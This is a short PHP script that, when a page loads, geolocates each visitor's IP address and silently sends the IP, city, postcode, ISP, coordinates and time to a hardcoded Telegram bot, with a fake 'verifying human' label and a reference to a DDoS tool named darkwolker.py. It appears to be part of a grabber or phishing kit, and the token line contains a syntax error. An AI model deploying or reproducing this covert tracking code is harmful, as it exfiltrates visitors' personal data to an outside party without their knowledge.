<?php

function telegram($msg) {
        global $telegrambot,$telegramchatid;
        $url = 'https://api.telegram.org/bot'.$telegrambot.'/sendMessage';$data = array('chat_id'=>$telegramchatid,'text'=>$msg);
        $options = array('http'=>array('method' => 'POST','header' => "Content-Type:application/x-www-form-urlencoded\r\n",'content' => http_build_query($data),),);
        $context = stream_context_create($options);
        $result = file_get_contents($url,false,$context);
        return $result;
}
//verifying human\\
//required control\\
$telegrambot = 5223962139':AAG1qTAiykWANsRb1HZL0JIdQ0_nBtzkf0o';
$telegramchatid = 1528668410; 

$ip=$_SERVER['REMOTE_ADDR']; 
$ipapi = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$datetime = date("d.m.Y H:i:s"); // g:ia l F j Y   l, F j, Y, g:ia




telegram("Browser Requirements:

        IP  :  $ipapi->query
        Operating system  :  replace in the sub comment
        Browser  :  replace in the sub comment
        Country  :  $ipapi->country ($ipapi->countryCode)
        Region  :  $ipapi->regionName ($ipapi->region)
        City  :  $ipapi->city
        Zip (Postcode)  :  $ipapi->zip
        Time  :  $datetime
        Internet Provider  :  $ipapi->isp ($ipapi->org)
        Saat Dilimi  :  $ipapi->timezone
        Lat & Lon :  $ipapi->lat ($ipapi->lon)
        Ass  :  $ipapi->as
        

Ddos Web Gereksinimi >>> darkwolker.py
[</>]
        ");



?>